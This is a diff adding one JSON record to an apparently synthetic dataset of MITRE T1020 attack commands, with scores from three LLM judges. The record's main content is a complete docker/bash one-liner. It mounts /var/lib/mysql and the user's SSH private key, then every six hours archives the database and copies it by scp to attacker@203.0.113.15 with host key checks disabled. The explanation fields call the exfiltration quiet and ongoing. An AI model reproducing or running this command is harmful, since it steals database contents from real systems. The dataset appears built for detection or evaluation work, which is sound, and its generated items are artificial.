@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1020",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "docker run -d --rm --name exfil_db --network host -v /var/lib/mysql:/data:ro -v $HOME/.ssh/id_rsa:/keys/id_rsa:ro bitnami/ssh-client:latest bash -lc 'while true; do TS=$(date +%s); ARCH=/tmp/mysql_$TS.tgz; tar -C /data -cz . > \"$ARCH\"; scp -q -i /keys/id_rsa -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \"$ARCH\" attacker@203.0.113.15:/srv/ex/$HOSTNAME/mysql_$TS.tgz; rm -f \"$ARCH\"; sleep 21600; done'",
+  "explanation": "Automates periodic archival of database files from /var/lib/mysql and quietly exfiltrates via scp over SSH.",
+  "rationale_steps": [
+    "Uses docker to read sensitive DB files as root within container",
+    "Creates compressed archives to reduce transfer size",
+    "Transfers quietly over SSH with host key checks disabled",
+    "Loops every 6 hours for ongoing automated exfiltration"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1020-3bfa6c8a-f9df836d",
+  "source_prompt_hash": "3bfa6c8a",
+  "timestamp_utc": "2025-09-30T09:14:36.595419Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed docker run with valid flags and a balanced, properly quoted bash loop and commands.",
+        "semantic_score": 4,
+        "semantic_justification": "It automates periodic compression of MySQL data and exfiltration via scp over SSH, though it assumes the remote directory exists and may fail otherwise.",
+        "combined_score": 4.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T04:06:07.308857Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, proper command separators, valid flags, and correct Docker syntax including volume mounts, networking configuration, and a properly structured bash script with error handling.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly implements automated exfiltration by creating a Docker container that runs continuously, periodically (every 6 hours) compressing MySQL database files and exfiltrating them via SCP to a remote server with proper authentication and cleanup.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T05:56:41.962025Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, valid flags, correct command substitutions, and proper command separation within the bash script.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly aligns with T1020 Automated Exfiltration by using a containerized, scheduled process to archive and compress database files, then exfiltrate them via SCP to an external attacker-controlled IP.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T05:56:56.201463Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.667,
+    "llm_average_score": 4.833,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
